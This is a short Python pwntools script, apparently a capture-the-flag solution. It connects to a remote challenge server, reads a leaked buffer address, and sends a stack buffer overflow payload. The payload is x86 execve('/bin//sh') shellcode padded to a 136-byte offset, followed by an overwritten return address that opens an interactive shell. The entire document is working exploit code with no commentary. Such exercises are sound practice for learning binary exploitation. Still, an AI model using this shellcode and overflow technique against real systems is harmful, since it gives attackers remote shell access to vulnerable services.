from pwn import *

#r = process("./membuat")
r = remote("103.200.7.150",30902)
r.sendline("q")
r.recv(1)
r.recvuntil("buffer ada di : ")

buf = int(r.recv()[1:-2],16)
buff = p32(buf)
offset = 136

shellcode = ""
shellcode += "\x31\xc9\xf7\xe1\x51\x68\x2f\x2f"
shellcode += "\x73\x68\x68\x2f\x62\x69\x6e\x89"
shellcode += "\xe3\xb0\x0b\xcd\x80"

panjang = len(shellcode)

payload = shellcode + "A" * (offset - panjang)
payload += buff

r.sendline(payload)
r.interactive()
